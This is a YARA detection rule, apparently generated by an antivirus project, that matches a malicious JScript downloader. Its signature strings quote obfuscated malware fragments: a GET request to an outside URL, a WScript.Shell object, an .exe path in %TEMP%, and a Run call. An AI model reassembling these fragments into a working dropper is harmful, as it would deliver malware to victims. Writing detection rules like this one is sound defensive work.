rule sig_20160330_6cfdf424e59cd934f21b0535c41e474b {
  meta:
    description = "datamaliciousorder - file 20160330_6cfdf424e59cd934f21b0535c41e474b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e460b531781b67c86ebec14d5633d601fdb3fffef25afa36c705dd566c8128f0"

  strings:
    $s1  = "_EB[_EC](\"GET\", \"http://itead-europe.com/k3ias\", false);" fullword ascii
    $s2  = "function _M(_T, _U){_CE = _CE * 1; return _T - _U;};" fullword ascii
    $s3  = "var _IX = function _J() {return WScript[_B0](\"WScript\"+\".Shell\");}(), _J0 = 11;" fullword ascii
    $s4  = "if (_EB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _IP() {return _IX[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"QeBg71UnZ5Kevk.ex\" + \"e\";};" fullword ascii
    $s6  = "function _QK(){return _G1 + \"\";};" fullword ascii
    $s7  = "function _G() {return ((_A0 == true) && (_A0 == _Z)) ? 1 : _CE;};" fullword ascii
    $s8  = "function _IO(_YO){_IX[\"Run\"](_YO, _CE, _CE);};" fullword ascii
    $s9  = " while (_B){" fullword ascii
    $s10 = "function _E(){return _B0;};" fullword ascii
    $s11 = "var _W = new this[\"Date\"]();" fullword ascii
    $s12 = "function _VG()" fullword ascii
    $s13 = "function _GR(){return 22;};" fullword ascii
    $s14 = "return _M(_H0, _KU);" fullword ascii
    $s15 = "function _FL(_H) {var _G0 = (1, 2, 3, 4, 5, _H); return _G0;};" fullword ascii
    $s16 = "_A0 = true; " fullword ascii
    $s17 = "var _A0 = false;" fullword ascii
    $s18 = "var _GK = false;" fullword ascii
    $s19 = "_Z = true; " fullword ascii
    $s20 = "var _Z = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}